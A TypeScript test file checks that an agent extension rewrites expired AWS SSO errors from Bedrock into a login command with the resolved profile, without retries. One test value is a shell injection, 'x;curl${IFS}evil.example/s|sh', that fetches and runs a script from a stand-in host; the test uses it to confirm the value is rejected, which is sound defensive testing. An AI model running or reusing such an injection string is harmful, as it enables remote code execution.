/**
 * An expired AWS credential surfaces the exact `aws sso login --profile <name>` command and is attempted once. The SSO
 * strings are fixtures this repository wrote; whether a real expiry matches them is runbook RB-03-03. All six are
 * already non-retryable in Pi, so the `callCount === 1` claim leans on a retryable 503 control that retries.
 * The profile name comes from the ambient AWS_PROFILE; stored-credential precedence is bedrock-auth.test.ts's job.
 */
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";

import type { AssistantMessage, FauxResponseStep } from "@earendil-works/pi-ai";
import { fauxAssistantMessage, isRetryableAssistantError } from "@earendil-works/pi-ai";

import { beforeAll, describe, expect, it } from "vitest";

import {
	AWS_PROFILE_ENV,
	AWS_SSO_LOGIN_PREFIX,
	BEDROCK_PROVIDER_ID,
	PROFILE_PLACEHOLDER,
	PROFILE_TEMPLATE_SENTINEL,
	SAFE_PROFILE_NAME,
	SSO_DIAGNOSTIC_ORIGINAL_KEY,
	SSO_DIAGNOSTIC_TYPE,
} from "../../.pi/extensions/providers/schema.ts";
import { NON_SSO_FIXTURES, RETRYABLE_CONTROL_FIXTURE, SSO_FIXTURES } from "../fixtures/provider-errors.ts";
import { SSO_PATTERNS } from "../../.pi/extensions/providers/sso.ts";
import { repoRoot } from "../helpers/git.ts";
import { withFauxSession } from "../helpers/session.ts";

/** Absolute path of the providers extension this repository ships. */
const EXTENSION_ENTRY = `${repoRoot()}/.pi/extensions/providers/index.ts`;

/** A distinctive profile name, found nowhere else, so seeing it in a message proves it was resolved and interpolated. */
const FIXTURE_PROFILE = "ky-fixture-sso-profile";

/** Where the probe appends one JSON line per `message_end`, post-chain. */
const MESSAGE_END_DUMP = "message-end.jsonl";

/** Where the probe appends the agent's own message list per `agent_end`. */
const AGENT_END_DUMP = "agent-end.jsonl";

/** What one driven session produced. */
interface Capture {
	/** Every message the chain finalized, in order, as the probe saw it. */
	observed: AssistantMessage[];
	/** Assistant messages from every `agent_end` of the run, flattened. */
	settled: AssistantMessage[];
	/** Provider ATTEMPTS: `state.callCount++` is the first statement of faux's stream(). */
	callCount: number;
	/** Scripted responses left unconsumed. */
	pending: number;
}

/**
 * The shipped classifier plus two observers that append to files (jiti gives the extension its own module registry, so
 * an in-process counter would never move). The `message_end` observer registers last so it sees the replacement.
 */
function probeSource(): string {
	return [
		'import { appendFileSync } from "node:fs";',
		'import { join } from "node:path";',
		`import providers from ${JSON.stringify(EXTENSION_ENTRY.replace(/\\/g, "/"))};`,
		"export default function (pi) {",
		"\tproviders(pi);",
		'\tpi.on("message_end", (event, ctx) => {',
		`\t\tappendFileSync(join(ctx.cwd, ${JSON.stringify(MESSAGE_END_DUMP)}), JSON.stringify(event.message) + "\\n", "utf-8");`,
		"\t});",
		'\tpi.on("agent_end", (event, ctx) => {',
		`\t\tappendFileSync(join(ctx.cwd, ${JSON.stringify(AGENT_END_DUMP)}), JSON.stringify(event.messages) + "\\n", "utf-8");`,
		"\t});",
		"}",
		"",
	].join("\n");
}

/** Read a dump file as one parsed JSON value per line. Absent counts as empty. */
function readDump(cwd: string, name: string): unknown[] {
	const file = join(cwd, name);
	if (!existsSync(file)) {
		return [];
	}
	return readFileSync(file, "utf-8")
		.split("\n")
		.filter((line) => line !== "")
		.map((line) => JSON.parse(line) as unknown);
}

/** Only the assistant messages, which are the only ones this file asserts on. */
function assistantOnly(messages: unknown[]): AssistantMessage[] {
	return messages.filter(
		(message): message is AssistantMessage =>
			typeof message === "object" &&
			message !== null &&
			(message as { role?: unknown }).role === "assistant",
	);
}

/** Sets an env var for `fn`, deleting rather than blanking a key that was absent: `""` satisfies `??` while naming nothing. */
async function withEnv<T>(name: string, value: string | undefined, fn: () => Promise<T>): Promise<T> {
	const had = Object.hasOwn(process.env, name);
	const previous = process.env[name];
	if (value === undefined) {
		delete process.env[name];
	} else {
		process.env[name] = value;
	}
	try {
		return await fn();
	} finally {
		if (had) {
			process.env[name] = previous as string;
		} else {
			delete process.env[name];
		}
	}
}

/** A real non-Bedrock neighbour (the fallback chain's second hop) for the provider-gate control. */
const NON_BEDROCK_PROVIDER_ID = "dashscope";

/** Drive one session whose first provider response is an error carrying `errorText`. */
async function drive(options: {
	errorText: string;
	profile: string | undefined;
	/** Extra scripted responses after the error, for the retrying control. */
	then?: FauxResponseStep[];
	/** The provider the faux message claims; Bedrock is the only one whose failures may be rewritten. */
	providerId?: string;
}): Promise<Capture> {
	return await withEnv(AWS_PROFILE_ENV, options.profile, async () =>
		withFauxSession(
			{
				extensionSource: probeSource(),
				providerId: options.providerId ?? BEDROCK_PROVIDER_ID,
				responses: [
					fauxAssistantMessage("", {
						stopReason: "error",
						errorMessage: options.errorText,
					}),
					...(options.then ?? []),
				],
			},
			async ({ session, faux, cwd }) => {
				await session.prompt("say something");
				return {
					observed: assistantOnly(readDump(cwd, MESSAGE_END_DUMP)),
					settled: assistantOnly(readDump(cwd, AGENT_END_DUMP).flat()),
					callCount: faux.state.callCount,
					pending: faux.getPendingResponseCount(),
				};
			},
		),
	);
}

/** The first error-stopped assistant message of a capture, or `undefined`. */
function firstError(messages: AssistantMessage[]): AssistantMessage | undefined {
	return messages.find((message) => message.stopReason === "error");
}

/** One SSO fixture's run, kept beside the fixture it came from. */
interface SsoRun {
	fixture: (typeof SSO_FIXTURES)[number];
	capture: Capture;
}

/**
 * Values that pass the shape bounds yet are not profile names, rejected by different mechanisms: the unedited
 * template placeholder (only the equality check catches it) and a shell-metacharacter name (only the charset bound).
 */
const NOT_A_PROFILE: ReadonlyArray<readonly [string, string]> = [
	["the unedited auth-template placeholder", PROFILE_TEMPLATE_SENTINEL],
	["a name carrying shell metacharacters", "x;curl${IFS}evil.example/s|sh"],
];

let ssoRuns: SsoRun[];
let placeholderRun: Capture;
let notAProfileRuns: { label: string; value: string; capture: Capture }[];
let control: Capture;
let foreignProviderRuns: SsoRun[];

describe("PROV-05 — the SSO classifier on a live in-memory session", () => {
	beforeAll(async () => {
		ssoRuns = [];
		for (const fixture of SSO_FIXTURES) {
			ssoRuns.push({
				fixture,
				capture: await drive({ errorText: fixture.text, profile: FIXTURE_PROFILE }),
			});
		}

		// Paired positive: with no profile at all, the placeholder must appear.
		placeholderRun = await drive({ errorText: SSO_FIXTURES[0].text, profile: undefined });

		notAProfileRuns = [];
		for (const [label, value] of NOT_A_PROFILE) {
			notAProfileRuns.push({
				label,
				value,
				capture: await drive({ errorText: SSO_FIXTURES[0].text, profile: value }),
			});
		}

		// The same credential text from a non-Bedrock vendor must not be rewritten.
		foreignProviderRuns = [];
		for (const fixture of SSO_FIXTURES) {
			foreignProviderRuns.push({
				fixture,
				capture: await drive({
					errorText: fixture.text,
					profile: FIXTURE_PROFILE,
					providerId: NON_BEDROCK_PROVIDER_ID,
				}),
			});
		}

		// Retryable on purpose, with a second response for the retry to land on.
		control = await drive({
			errorText: RETRYABLE_CONTROL_FIXTURE.text,
			profile: FIXTURE_PROFILE,
			then: [fauxAssistantMessage("recovered")],
		});
	});

	it("captured something at all (guards against a vacuous pass)", () => {
		// An empty capture means the extension never loaded, so every assertion below would be about nothing. The floors
		// are literals: comparing against the length of the loop that built the array can never differ.
		expect(
			ssoRuns.length,
			"the six credential fixtures PROV-05 is written against must each be driven. " +
				"Comparing against SSO_FIXTURES.length compares the loop with itself and is " +
				"satisfied by an empty table [WR-04]",
		).toBeGreaterThanOrEqual(6);

		for (const run of ssoRuns) {
			expect(
				run.capture.observed.length,
				`the run for ${JSON.stringify(run.fixture.text.slice(0, 40))} produced no assistant ` +
					"message_end at all. The likeliest cause is the providers extension not loading — it " +
					"must sit at USER scope, which is what `extensionSource` in tests/helpers/session.ts " +
					"arranges, because project-scoped `.pi/extensions` is gated behind project trust and " +
					"that resolves false headless",
			).toBeGreaterThan(0);
		}

		expect(
			control.observed.length,
			"the negative control captured nothing, so 'passes through untouched' would be vacuous",
		).toBeGreaterThan(0);
	});

	it("case 1 — the surfaced message names the exact command with the RESOLVED profile", () => {
		for (const { fixture, capture } of ssoRuns) {
			const message = firstError(capture.settled);
			expect(
				message,
				`no error-stopped assistant message survived to agent_end for ${JSON.stringify(fixture.text)}. ` +
					"This case asserts on what the SESSION ended with rather than on what the handler " +
					"returned, because that is what the user reads and what Pi's retry gate re-reads",
			).toBeDefined();

			expect(
				message?.errorMessage,
				`the surfaced message does not contain ${JSON.stringify(AWS_SSO_LOGIN_PREFIX + FIXTURE_PROFILE)}. ` +
					"PROV-05 is a requirement about this exact string: an SSO session lasts 8-12 hours, so " +
					"the user meets this roughly daily, and the whole value of the fix is that they do not " +
					"have to remember the command or which profile it takes",
			).toContain(`${AWS_SSO_LOGIN_PREFIX}${FIXTURE_PROFILE}`);

			expect(
				message?.errorMessage,
				"the surfaced message still carries the PLACEHOLDER. A line reading `--profile <profile>` " +
					"verbatim is precisely the failure this requirement exists to prevent: it repeats what " +
					"the user already knows and names nothing they can paste",
			).not.toContain(PROFILE_PLACEHOLDER);

			expect(
				message?.errorMessage,
				"the surfaced message is byte-identical to the provider's own text, so no rewrite " +
					"happened at all for this fixture — the classifier did not match it",
			).not.toBe(fixture.text);

			// The replacement must be a complete message: the runner replaces the live object's keys wholesale
			// (pi dist/core/agent-session.js:425-438), so a patch would erase role, usage and model.
			expect(message?.role, "the replacement lost `role`, which the runner also rejects").toBe(
				"assistant",
			);
			expect(
				message?.usage,
				"the replacement lost `usage`, so this turn's cost vanished from every total Phase 8 " +
					"computes — the signature of a patch object returned where a complete message is required",
			).toBeDefined();
			expect(
				message?.model,
				"the replacement lost `model`, so nothing downstream can say which model failed",
			).toBeDefined();
			expect(
				Array.isArray(message?.content),
				"the replacement lost `content`, which is what the renderer walks",
			).toBe(true);
		}
	});

	it("case 2 — the provider was attempted exactly once", () => {
		// Counted as attempts (`state.callCount++` opens faux's stream()). Read with case 6, whose retryable error gets 2.
		for (const { fixture, capture } of ssoRuns) {
			expect(
				capture.callCount,
				`the provider was called ${capture.callCount} times for ` +
					`${JSON.stringify(fixture.text.slice(0, 48))}. Every retry is 2 s, 4 s then 8 s of ` +
					"wall clock spent against a credential that cannot become valid until the user runs " +
					"the command in the message [threat T-03-08-02]",
			).toBe(1);
		}
	});

	it("case 3 — the original SDK text is kept out of the message and carried on the diagnostic", () => {
		for (const { fixture, capture } of ssoRuns) {
			const message = firstError(capture.settled);

			expect(
				message?.errorMessage,
				"the rewritten message carries the original SDK text. That is Trap T4: the original may " +
					"contain `timed out`, `fetch failed`, `socket hang up`, `getaddrinfo` or a 5xx status " +
					"from the token-refresh call itself, and re-admitting any of them to Pi's retryable " +
					"pattern silently restores the retry loop this requirement forbids",
			).not.toContain(fixture.text);

			const diagnostic = (message?.diagnostics ?? []).find(
				(entry) => entry.type === SSO_DIAGNOSTIC_TYPE,
			);
			expect(
				diagnostic,
				"no diagnostic records why the message was rewritten. Without it the evidence for the " +
					"replacement is gone: nobody can see what the provider actually said, and a false " +
					"positive would be indistinguishable from a real expiry",
			).toBeDefined();

			expect(
				diagnostic?.details?.[SSO_DIAGNOSTIC_ORIGINAL_KEY],
				"the diagnostic does not carry the provider's original text, so the text was discarded " +
					"rather than moved. `diagnostics[]` is read by nothing in Pi's retry classifier " +
					"(pi-ai dist/utils/retry.js:165-172), which is exactly why it is the right home for it",
			).toBe(fixture.text);
		}
	});

	it("case 4 — the placeholder is what appears when nothing resolves a profile", () => {
		// Paired positive for case 1's `not.toContain`.
		const message = firstError(placeholderRun.settled);
		expect(
			message,
			"the no-profile run produced no error-stopped message, so this case checks nothing",
		).toBeDefined();

		expect(
			message?.errorMessage,
			"with no stored credential and no ambient AWS_PROFILE, the message must still name the " +
				"command and fall back to the placeholder. If the placeholder never appears here, " +
				"case 1's assertion that it is absent proves nothing",
		).toContain(PROFILE_PLACEHOLDER);

		expect(
			message?.errorMessage,
			"the fallback line must still point the reader somewhere: RB-03-03 is the runbook entry " +
				"that explains that `aws sso login` sets no environment variable and that the profile " +
				"belongs in auth.json",
		).toContain("RB-03-03");

		expect(
			message?.errorMessage,
			"the no-profile run leaked the distinctive fixture profile name, so the two runs are not " +
				"actually isolated and case 1 may be reading a name the environment supplied rather " +
				"than one the handler resolved",
		).not.toContain(FIXTURE_PROFILE);
	});

	it("case 4b — a value that is not a profile name falls back to the placeholder, never into the command", () => {
		// A literal floor of 2, one per mechanism: comparing against the table's own length can never fail, and one row
		// would let the sentinel row and its equality check be deleted with nothing red.
		expect(
			NOT_A_PROFILE.length,
			"two rows, rejected by two DIFFERENT mechanisms: the auth-template sentinel by the " +
				"equality check in `usableProfileName` (no shape bound can ever reject it — it is " +
				"29 characters drawn entirely from the AWS profile charset), and the metacharacter " +
				"name by SAFE_PROFILE_NAME. Dropping either row makes its guard deletable with " +
				"nothing red, and for the sentinel that is CR-01 restored: a hand-copied template " +
				"entry surfaces `aws sso login --profile REPLACE_WITH_AWS_PROFILE_NAME` with the " +
				"RB-03-03 pointer suppressed [CR-01, WR-01]",
		).toBeGreaterThanOrEqual(2);

		expect(
			notAProfileRuns.length,
			"no not-a-profile value was driven, so every assertion below iterates nothing. " +
				"Comparing against NOT_A_PROFILE.length would compare the loop with itself and is " +
				"satisfied by an empty table — the WR-04 shape, in the case written to close " +
				"CR-01 [WR-01]",
		).toBeGreaterThanOrEqual(2);

		// The mechanisms really differ: SAFE_PROFILE_NAME must accept the sentinel, which is why the equality check exists.
		expect(
			SAFE_PROFILE_NAME.test(PROFILE_TEMPLATE_SENTINEL),
			"SAFE_PROFILE_NAME now rejects the auth-template sentinel, so the two rows above are " +
				"no longer covering two mechanisms and the floor of 2 could be met by two " +
				"shape-rejected values. If the shape bound genuinely subsumes the sentinel, say so " +
				"deliberately and re-derive whether the equality check in `usableProfileName` is " +
				"still load-bearing — do not leave this assertion inverted [CR-01, WR-01]",
		).toBe(true);
		expect(
			NOT_A_PROFILE.some(([, value]) => value === PROFILE_TEMPLATE_SENTINEL),
			"the auth-template sentinel row is gone from NOT_A_PROFILE. It is the ONLY row that " +
				"exercises the equality check in `usableProfileName`, and that check is the only " +
				"thing that can ever reject the string bin/bootstrap.sh withholds and a hand-copy " +
				"installs [CR-01, WR-01]",
		).toBe(true);

		for (const { label, value, capture } of notAProfileRuns) {
			const message = firstError(capture.settled);
			expect(
				message,
				`the ${label} run produced no error-stopped message, so this row checks nothing`,
			).toBeDefined();

			expect(
				message?.errorMessage,
				`${label} (${JSON.stringify(value)}) was interpolated into the surfaced command. ` +
					"The user is being handed `aws sso login --profile <that>` and trained to paste " +
					"it: for the auth-template placeholder that is a command which cannot work with " +
					"the RB-03-03 pointer suppressed, and for a metacharacter-bearing value it is a " +
					"shell line this repository composed [CR-01, WR-01]",
			).not.toContain(value);

			expect(
				message?.errorMessage,
				`${label} must fall back to the placeholder. Falling back is the whole remedy: it ` +
					"is what makes the dead end visible instead of dressing it up as a command",
			).toContain(PROFILE_PLACEHOLDER);

			expect(
				message?.errorMessage,
				"the fallback line must carry the RB-03-03 pointer, which is the exit from the " +
					"dead end. Without it the user is told a profile is missing and not where to " +
					"put one",
			).toContain("RB-03-03");
		}
	});

	it("case 5 — the direction: every rewritten fixture is non-retryable, and what was already true", () => {
		// Both columns over all six: `retryableToday` records Pi's verdict on the original string, so a Pi bump that moves
		// one names the expired claim. The 503 control must return true, or every `false` below is vacuous.
		const controlOriginal = firstError(control.observed) as AssistantMessage;
		expect(
			isRetryableAssistantError(controlOriginal),
			"Pi's retry predicate reports the untouched 503 as NOT retryable. Either Pi's pattern " +
				"changed or the predicate is not seeing a message it understands — and until it says " +
				"`true` about something, every `false` asserted below means nothing",
		).toBe(true);
		expect(
			RETRYABLE_CONTROL_FIXTURE.retryableToday,
			"the control fixture is no longer recorded as retryable, so the oracle above is asserting " +
				"the opposite of what the table says",
		).toBe(true);

		for (const { fixture, capture } of ssoRuns) {
			const before: AssistantMessage = {
				...(firstError(capture.settled) as AssistantMessage),
				errorMessage: fixture.text,
			};
			expect(
				isRetryableAssistantError(before),
				`Pi's own verdict on the UNMODIFIED string ${JSON.stringify(fixture.text.slice(0, 48))} ` +
					`no longer matches the value recorded in schema.ts (${String(fixture.retryableToday)}). ` +
					"That table is the record of what was already true before this extension existed; " +
					"update it deliberately, and re-read whether PROV-05's retry half is still a " +
					"preservation rather than a fix",
			).toBe(fixture.retryableToday);

			const after = firstError(capture.settled) as AssistantMessage;
			expect(
				isRetryableAssistantError(after),
				"the REWRITTEN message is retryable. Whatever the message now says, it has re-admitted " +
					"itself to Pi's retryable pattern — the likeliest cause is the original SDK text " +
					"creeping back into errorMessage, or a profile name that itself contains a retryable " +
					"token such as `timeout` (Trap T4, threat T-03-08-02)",
			).toBe(false);
		}
	});

	it("case 6 — the negative control: a transient error passes through byte-identical and IS retried", () => {
		// Without this, a handler that rewrites everything satisfies the file, and a session that never retries proves nothing.
		const message = firstError(control.observed);
		expect(
			message,
			"the control produced no error-stopped message at all, so 'untouched' is about nothing",
		).toBeDefined();

		expect(
			message?.errorMessage,
			"a 503 was rewritten. The classifier fired on a service problem: the user's credentials " +
				"were fine, the retries that would have succeeded are gone, and they have been sent to " +
				"re-authenticate for nothing [threat T-03-08-03]",
		).toBe(RETRYABLE_CONTROL_FIXTURE.text);

		expect(
			(message?.diagnostics ?? []).some((entry) => entry.type === SSO_DIAGNOSTIC_TYPE),
			"the control message carries the classifier's diagnostic, so the handler ran its effect " +
				"on a message it left textually alone — the classification is wrong even where the " +
				"text survived",
		).toBe(false);

		expect(
			control.callCount,
			"the retryable control was NOT retried, so this harness never retries anything and " +
				"case 2's `callCount === 1` is a property of the test setup rather than a measurement " +
				"of non-retryability. Pi's retry defaults are enabled/3/2000ms " +
				"(pi 0.84.1 dist/core/settings-manager.js:539-555)",
		).toBe(2);

		expect(
			control.pending,
			"the second scripted response was never consumed, so the retry did not actually reach " +
				"the provider",
		).toBe(0);
	});

	it("case 6b — WR-05: the SAME credential text from a non-Bedrock provider survives byte-identical", () => {
		// The same six strings from dashscope must pass through untouched: the rewrite discards the original text from
		// errorMessage, so a false positive destroys what the provider actually said.
		expect(
			foreignProviderRuns.length,
			"no non-Bedrock run was driven, so the provider gate is never exercised on the " +
				"branch where it must NOT fire",
		).toBeGreaterThanOrEqual(6);

		for (const { fixture, capture } of foreignProviderRuns) {
			const message = firstError(capture.settled);
			expect(
				message,
				`the non-Bedrock run for ${JSON.stringify(fixture.text.slice(0, 40))} produced no ` +
					"error-stopped message, so this row asserts nothing",
			).toBeDefined();

			expect(
				message?.provider,
				"the fixture did not actually come from a non-Bedrock provider, so this whole " +
					"case is a second copy of the positive runs",
			).toBe(NON_BEDROCK_PROVIDER_ID);

			expect(
				message?.errorMessage,
				`a ${NON_BEDROCK_PROVIDER_ID} failure was rewritten into an AWS re-authentication ` +
					"instruction. The user is told to run `aws sso login` because a different vendor " +
					"failed, and the vendor's own text is GONE from errorMessage -- it survives only " +
					"on diagnostics[], which nothing renders [WR-05]",
			).toBe(fixture.text);

			expect(
				(message?.diagnostics ?? []).some((entry) => entry.type === SSO_DIAGNOSTIC_TYPE),
				"the non-Bedrock message carries the classifier's diagnostic, so the handler ran " +
					"its effect on a provider it must not touch -- the gate is wrong even where the " +
					"text happened to survive",
			).toBe(false);
		}

		// Paired positive: a handler that rewrote nothing would satisfy every assertion above.
		const bedrockMessage = firstError(ssoRuns[0]?.capture.settled ?? []);
		expect(
			bedrockMessage?.provider,
			"the positive runs are not coming from Bedrock either, so the gate is untested in " +
				"the direction where it must fire and this case proves only that nothing is ever " +
				"rewritten",
		).toBe(BEDROCK_PROVIDER_ID);
		expect(
			bedrockMessage?.errorMessage,
			"the same fixture from Bedrock was NOT rewritten, so the provider gate rejects " +
				"everything and PROV-05 is unmet",
		).not.toBe(SSO_FIXTURES[0]?.text);
	});

	it("case 7 — the exclusion rule holds pattern by pattern, in both directions", () => {
		// Over the pattern table itself, so an overreaching pattern fails here rather than in production.
		expect(
			SSO_PATTERNS.length,
			"the pattern table is empty, so the classifier matches nothing and every SSO case above " +
				"would have to be failing already — assert the set non-empty before looping over it",
		).toBeGreaterThanOrEqual(5);

		// A floor on NON_SSO_FIXTURES too: truncating it to the one indexed entry would silently shorten the exclusion loop.
		expect(
			NON_SSO_FIXTURES.length,
			"the exclusion rule is asserted over this set; an emptied or truncated one makes " +
				"`overreaching` trivially [] for every pattern, and the classifier could then " +
				"match a retryable 503 with the whole file still green [WR-03]",
		).toBeGreaterThanOrEqual(3);

		expect(
			SSO_FIXTURES.length,
			"the dead-pattern check below is asserted over this set; an emptied one makes every " +
				"pattern dead and the `dead` list is then everything, which is loud — but a " +
				"TRUNCATED one quietly narrows what 'not dead' means [WR-03]",
		).toBeGreaterThanOrEqual(6);

		const overreaching: string[] = [];
		for (const entry of SSO_PATTERNS) {
			for (const fixture of NON_SSO_FIXTURES) {
				if (entry.pattern.test(fixture.text)) {
					overreaching.push(`${entry.label} matched ${JSON.stringify(fixture.text)}`);
				}
			}
		}
		expect(
			overreaching,
			"these patterns match a provider error that is NOT a credential failure. Two of the three " +
				"controls are retryable, so such a match would move a recoverable failure to " +
				"non-retryable and hide it behind an instruction to re-authenticate — the inverse of " +
				"the requirement [threat T-03-08-03]",
		).toEqual([]);

		const dead = SSO_PATTERNS.filter(
			(entry) => !SSO_FIXTURES.some((fixture) => entry.pattern.test(fixture.text)),
		).map((entry) => `${entry.label} — ${String(entry.pattern)}`);
		expect(
			dead,
			"these patterns match none of the six credential fixtures, so they are dead: the exclusion " +
				"assertion above passes for them no matter what they contain, and the classifier is " +
				"quietly narrower than it reads",
		).toEqual([]);
	});
});
